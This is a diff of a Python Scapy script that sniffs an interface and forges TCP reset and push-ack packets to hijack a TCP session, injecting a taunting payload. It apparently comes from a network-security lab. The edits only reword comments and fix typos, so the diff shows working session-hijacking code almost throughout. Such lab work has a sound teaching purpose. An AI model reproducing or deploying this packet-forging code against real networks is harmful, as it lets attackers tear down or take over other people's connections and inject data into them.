@@ -3,8 +3,7 @@
 from scapy.all import *
 from scapy.layers.l2 import Ether
 
-# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet and TCP pcaket with PA flag,
-# then crafts new TCP pcket with "A" flag and forwards it accordingly, in order to hijack the TCP session.
+# The script sniffs the channel on ens34 and looks for TCP packet "A" flag and acts accordingly.
 
 # function to process the packet
 def process_packet(packet):
@@ -31,7 +30,7 @@ def process_packet(packet):
         # Create the packet by stacking the layers
         pkt = eth / ipv6 / ipv4 / tcp
         
-        # Prepare the "PA" Packet 
+        # Prepare the "PA" flagged TCP Packet 
         mac_src2 = packet[Ether].src
         mac_dst2 = packet[Ether].dst
         eth2 = Ether(dst=mac_dst2, src=mac_src2)
@@ -57,7 +56,7 @@ def process_packet(packet):
         # Now we send the two prepared packets 
         # Send the TCP Reset Packet
         sendp(pkt, iface='ens34')
-        print(f"I just sent TCP RESET Packet the the Client")
+        print(f"I just sent TCP RESET Packet to the Client")
        
         # Send the PA Packet
         sendp(pkt2, iface='ens34')
@@ -86,12 +85,11 @@ def process_packet(packet):
         # Create the TCP layer with the RST flag set
         tcp = TCP(sport=src_port, dport=dst_port, seq=new_seq, window=0, flags='PA')
         # Create the payload
-        data3 = "Again I am the new Hijacked Machine again :)"
+        data3 = "I am the new Hijacking Machine again :)"
         # Create the packet by stacking the layers
         pkt = eth / ipv6 / ipv4 / tcp / data3
         # Send the TCP PA Packet
         sendp(pkt, iface='ens34')
-        print(f"I just sent TCP Packet the the Server with PA flag again")
+        print(f"I just sent TCP Packet to the Server with PA flag again")
         
 sniff(iface='ens34', prn=process_packet)
-
